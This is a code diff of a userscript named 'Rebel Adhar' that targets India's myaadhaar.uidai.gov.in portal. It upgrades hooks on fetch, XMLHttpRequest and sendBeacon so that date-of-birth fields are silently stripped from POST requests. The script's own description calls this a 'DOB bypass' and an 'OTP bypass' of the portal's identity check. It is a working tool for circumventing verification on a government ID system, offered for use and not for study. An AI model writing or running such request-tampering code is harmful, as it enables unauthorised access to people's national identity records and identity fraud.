@@ -1,16 +1,16 @@
 // ==UserScript==
 // @name         Rebel Adhar
 // @namespace    https://github.com/ujjwalrebel53-wq/SpinPlay99
-// @version      10.1.0
-// @description  Rebel Adhar Advanced — DOB bypass + OTP payload strip (no fake date)
+// @version      10.2.0
+// @description  Rebel Adhar — server se DOB strip + OTP bypass (no fake date)
 // @match        https://myaadhaar.uidai.gov.in/*
 // @match        https://*.uidai.gov.in/*
 // @grant        none
-// @run-at       document-idle
+// @run-at       document-start
 // ==/UserScript==
 
 /**
- * UIDAI Engine v10 — Advanced DOB bypass: mode switch + neutralize + OTP payload strip
+ * UIDAI Engine v10.2 — Server-side DOB strip + mode switch bypass
  */
 (function (root, factory) {
   if (typeof module !== 'undefined' && module.exports) {
@@ -233,75 +233,147 @@
 
   /** Angular email empty block karta hai — disable + validators clear */
   function isDobPayloadKey(key) {
-    return (
-      isDobControlKey(key) ||
-      /^(dob|dateofbirth|date_of_birth|dateOfBirth|birthDate|birth_date|dtbirth|userdob|dobstr)$/i.test(key || '')
-    );
+    const k = String(key || '');
+    if (!k) return false;
+    if (isDobControlKey(k)) return true;
+    if (/^(dob|dateofbirth|date_of_birth|dateOfBirth|birthDate|birth_date|birthDt|dtbirth|userdob|dobstr|dobdate|dateOfBirthStr)$/i.test(k))
+      return true;
+    if (/\bdob\b/i.test(k)) return true;
+    if (/birth/i.test(k) && /date|dt|day/i.test(k)) return true;
+    return false;
   }
 
-  function stripDobDeep(val, depth) {
-    if (val == null || depth > 12) return val;
+  function stripDobDeep(val, depth, removed) {
+    const rm = removed || [];
+    if (val == null || depth > 14) return val;
     if (typeof val === 'string') {
       const t = val.trim();
       if ((t.startsWith('{') && t.endsWith('}')) || (t.startsWith('[') && t.endsWith(']'))) {
         try {
-          return JSON.stringify(stripDobDeep(JSON.parse(t), depth + 1));
+          const parsed = stripDobDeep(JSON.parse(t), depth + 1, rm);
+          return JSON.stringify(parsed);
         } catch (_e) {}
       }
-      if (t.includes('=') && /[dD]ob|birth|dateOfBirth/.test(t)) {
-        return t
-          .split('&')
-          .filter((p) => {
-            const k = decodeURIComponent((p.split('=')[0] || '')).toLowerCase();
-            return !isDobPayloadKey(k);
-          })
-          .join('&');
+      if (t.includes('=') && /dob|birth|dateofbirth/i.test(t)) {
+        const kept = [];
+        t.split('&').forEach((p) => {
+          const k = decodeURIComponent((p.split('=')[0] || '')).trim();
+          if (isDobPayloadKey(k)) rm.push(k);
+          else kept.push(p);
+        });
+        return kept.join('&');
       }
       return val;
+    }
+    if (val instanceof URLSearchParams) {
+      const out = new URLSearchParams();
+      val.forEach((v, k) => {
+        if (isDobPayloadKey(k)) rm.push(k);
+        else out.append(k, v);
+      });
+      return out;
     }
     if (val instanceof FormData) {
       const fd = new FormData();
       val.forEach((v, k) => {
-        if (!isDobPayloadKey(k)) fd.append(k, v);
+        if (isDobPayloadKey(k)) rm.push(k);
+        else fd.append(k, v);
       });
       return fd;
     }
-    if (Array.isArray(val)) return val.map((x) => stripDobDeep(x, depth + 1));
+    if (Array.isArray(val)) return val.map((x) => stripDobDeep(x, depth + 1, rm));
     if (typeof val === 'object') {
       const out = {};
       Object.entries(val).forEach(([k, v]) => {
-        if (isDobPayloadKey(k)) return;
-        out[k] = stripDobDeep(v, depth + 1);
+        if (isDobPayloadKey(k)) {
+          rm.push(k);
+          return;
+        }
+        out[k] = stripDobDeep(v, depth + 1, rm);
       });
       return out;
     }
     return val;
   }
 
+  function stripDobFromBody(body) {
+    const removed = [];
+    const stripped = stripDobDeep(body, 0, removed);
+    return { body: stripped, removed: [...new Set(removed)] };
+  }
+
   function isRetrieveOtpUrl(url) {
-    return /otp|retrieve|send|generate|aadhaar|uidai|myaadhaar|auth|verify|gov\.in/i.test(String(url || ''));
+    const u = String(url || '');
+    return /otp|retrieve|send|generate|aadhaar|uidai|myaadhaar|auth|verify|validate|submit|gov\.in/i.test(u);
+  }
+
+  function shouldStripServerPost(url) {
+    const u = String(url || '');
+    if (isRetrieveOtpUrl(u)) return true;
+    if (/^\//.test(u) && /myaadhaar|uidai|retrieve|otp|aadhaar/i.test(location.pathname + location.host)) return true;
+    if (/uidai\.gov\.in|myaadhaar/i.test(u)) return true;
+    if (/uidai|myaadhaar|gov\.in/i.test(location.hostname) && (u === '' || /^\//.test(u))) return true;
+    return false;
   }
 
   function installNetworkBypass(hooks) {
-    if (window.__rebelNetBypass10) return;
-    window.__rebelNetBypass10 = true;
+    if (window.__rebelNetBypass11) return;
+    window.__rebelNetBypass11 = true;
     const log = hooks?.log;
     const enabled = hooks?.enabled || (() => true);
     const onHit = hooks?.onHit || (() => {});
 
+    function processPost(url, method, body) {
+      if (!enabled() || String(method).toUpperCase() !== 'POST' || body == null) return { body, removed: [] };
+      if (!shouldStripServerPost(url)) return { body, removed: [] };
+      const { body: stripped, removed } = stripDobFromBody(body);
+      if (removed.length) {
+        log?.('info', 'Server request se DOB hata di', {
+          url: String(url || '').slice(0, 100),
+          removed,
+        });
+      }
+      return { body: stripped, removed };
+    }
+
     const origFetch = window.fetch;
     if (origFetch) {
       window.fetch = function (input, init) {
+        if (input instanceof Request && (!init || init.body === undefined)) {
+          const req = input;
+          const method = String(req.method || 'GET').toUpperCase();
+          const url = req.url || '';
+          if (enabled() && method === 'POST' && shouldStripServerPost(url)) {
+            return req.text().then((text) => {
+              const { body, removed } = processPost(url, method, text);
+              onHit('fetch', method, url);
+              const headers = new Headers(req.headers);
+              if (removed.length) log?.('info', 'fetch POST stripped', { removed });
+              return origFetch.call(window, url, {
+                method: req.method,
+                headers,
+                body,
+                credentials: req.credentials,
+                mode: req.mode,
+                cache: req.cache,
+                redirect: req.redirect,
+                referrer: req.referrer,
+                integrity: req.integrity,
+              });
+            });
+          }
+          if (enabled() && (shouldStripServerPost(url) || method === 'POST')) onHit('fetch', method, url);
+          return origFetch.call(this, input, init);
+        }
+
         const opts = init ? Object.assign({}, init) : {};
         const url = typeof input === 'string' ? input : input?.url || '';
-        const method = String(opts.method || 'GET').toUpperCase();
-        if (enabled() && method === 'POST' && isRetrieveOtpUrl(url) && opts.body != null) {
-          opts.body = stripDobDeep(opts.body, 0);
-          log?.('info', 'OTP payload — DOB field hata di', url.slice(0, 100));
+        const method = String(opts.method || (input instanceof Request ? input.method : 'GET')).toUpperCase();
+        if (opts.body != null) {
+          const r = processPost(url, method, opts.body);
+          opts.body = r.body;
         }
-        if (enabled() && (isRetrieveOtpUrl(url) || method === 'POST')) {
-          onHit('fetch', method, url);
-        }
+        if (enabled() && (shouldStripServerPost(url) || method === 'POST')) onHit('fetch', method, url);
         return origFetch.call(this, input, opts);
       };
     }
@@ -310,20 +382,35 @@
     if (XHR) {
       const origOpen = XHR.open;
       const origSend = XHR.send;
+      const origSetHeader = XHR.setRequestHeader;
       XHR.open = function (method, url) {
         this.__rebelMethod = String(method || 'GET').toUpperCase();
         this.__rebelUrl = String(url || '');
+        this.__rebelHeaders = {};
         return origOpen.apply(this, arguments);
       };
+      XHR.setRequestHeader = function (name, value) {
+        if (!this.__rebelHeaders) this.__rebelHeaders = {};
+        this.__rebelHeaders[name] = value;
+        return origSetHeader.apply(this, arguments);
+      };
       XHR.send = function (body) {
-        if (enabled() && this.__rebelMethod === 'POST' && isRetrieveOtpUrl(this.__rebelUrl) && body != null) {
-          body = stripDobDeep(body, 0);
-          log?.('info', 'OTP payload — DOB field hata di', (this.__rebelUrl || '').slice(0, 100));
+        const url = this.__rebelUrl || '';
+        const method = this.__rebelMethod || 'GET';
+        if (body != null) {
+          const r = processPost(url, method, body);
+          body = r.body;
         }
-        if (enabled() && (isRetrieveOtpUrl(this.__rebelUrl) || this.__rebelMethod === 'POST')) {
-          onHit('xhr', this.__rebelMethod, this.__rebelUrl);
-        }
+        if (enabled() && (shouldStripServerPost(url) || method === 'POST')) onHit('xhr', method, url);
         return origSend.call(this, body);
+      };
+    }
+
+    if (navigator.sendBeacon) {
+      const origBeacon = navigator.sendBeacon.bind(navigator);
+      navigator.sendBeacon = function (url, data) {
+        const r = processPost(url, 'POST', data);
+        return origBeacon(url, r.body);
       };
     }
   }
@@ -1323,6 +1410,7 @@
     forceSubmitOtp,
     installNetworkBypass,
     stripDobDeep,
+    stripDobFromBody,
   };
 });
 
@@ -1331,6 +1419,15 @@
   'use strict';
   const E = UidaiRetrieveEngine;
   const KEY = 'rebelAdharOn';
+
+  window.__rebelNetHooks = {
+    log: function (level, msg, data) {
+      console.log('[Rebel Adhar]', level, msg, data ?? '');
+    },
+    enabled: function () { return localStorage.getItem(KEY) === '1'; },
+    onHit: function () {},
+  };
+  if (E.installNetworkBypass) E.installNetworkBypass(window.__rebelNetHooks);
   const LOG_ID = 'rebel-adhar-log-panel';
   const LOG_BODY = 'rebel-adhar-log-body';
   const UI_SEL = '#' + LOG_ID + ',#rebel-fab,#rebel-switch-btn,#rebel-logs-btn,#rebel-debug-btn,#rebel-status-strip';
@@ -1475,16 +1572,14 @@
   function installNet() {
     if (window.__rebelNet8) return;
     window.__rebelNet8 = true;
-    if (E.installNetworkBypass) {
-      E.installNetworkBypass({
-        log: log,
-        enabled: function () { return on; },
-        onHit: function (kind, method, url) {
-          if (!shouldLogNet(url, method)) return;
-          netCount += 1;
-          log('req', kind + ' ' + method, String(url || '').slice(0, 120));
-        },
-      });
+    if (window.__rebelNetHooks) {
+      window.__rebelNetHooks.log = log;
+      window.__rebelNetHooks.enabled = function () { return on; };
+      window.__rebelNetHooks.onHit = function (kind, method, url) {
+        if (!shouldLogNet(url, method)) return;
+        netCount += 1;
+        log('req', kind + ' ' + method, String(url || '').slice(0, 120));
+      };
     }
   }
 
